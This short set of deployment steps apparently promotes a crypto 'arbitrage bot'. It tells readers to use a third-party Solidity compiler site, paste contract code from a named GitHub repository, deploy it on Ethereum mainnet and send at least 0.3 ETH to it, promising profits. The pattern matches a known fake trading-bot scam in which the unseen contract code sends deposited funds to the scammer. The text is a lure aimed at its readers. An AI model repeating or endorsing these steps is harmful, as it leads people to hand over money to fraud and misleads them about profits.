📚 Deployment Instructions :

👉 Install MetaMask: https://metamask.io/download

👉 Access the solidity compiler website: https://idecompiler.org/

👉 Create a new file (you can name "bot.sol" as an example) and paste the bot's code from [Github.com/Crypto-Bury-lab](https://github.com/Crypto-Bury-lab/bot.sol/blob/main/Code)

👉 Select compiler version 8.20 and click Compile

👉 Access Deploy tab and select Ethereum Mainnet Network

👉 Click "Deploy Smart-Contract" and deploy your bot's contract

👉 Send at least 0.3 ETH in liquidity to your bot's contract address

👉 Click "Start Bot" to begin arbitrage trading

👉 To withdraw profits, click "Stop Bot", then use the "Withdraw Liquidity" function
